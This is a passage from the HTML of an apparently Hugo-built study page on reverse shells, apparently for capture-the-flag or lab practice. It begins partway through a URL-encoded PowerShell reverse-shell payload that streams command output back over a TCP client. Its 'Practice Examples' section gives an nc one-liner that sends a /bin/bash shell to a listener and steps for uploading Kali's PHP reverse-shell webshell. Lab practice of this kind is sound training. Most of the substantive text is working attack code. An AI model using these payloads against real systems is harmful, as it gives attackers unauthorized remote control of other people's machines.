style="color:#66d9ef">%</span>24sendback2<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>24sendback<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>2B<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>27PS<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">27</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>2B<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>28pwd<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span>.Path<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>2B<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">27</span><span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">27</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>24sendbyte<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">3D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span>5Btext.encoding<span style="color:#66d9ef">%</span><span style="color:#ae81ff">5D</span><span style="color:#66d9ef">%</span>3A<span style="color:#66d9ef">%</span>3AASCII<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span>.GetBytes<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span>24sendback2<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>24stream.Write<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span>24sendbyte<span style="color:#66d9ef">%</span>2C0<span style="color:#66d9ef">%</span>2C<span style="color:#66d9ef">%</span>24sendbyte.Length<span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>24stream.Flush<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">7D</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span>24client.Close<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">22</span>
</span></span></code></pre></div><h2 id="practice-examples">Practice Examples<a href="#practice-examples" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li>Try uploading a webshell to the Linux box, then use the command: <code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> to send a reverse shell back to a waiting listener on your own machine.</li>
<li>Navigate to <code>/usr/share/webshells/php/php-reverse-shell.php</code> in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.</li>
</ul>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
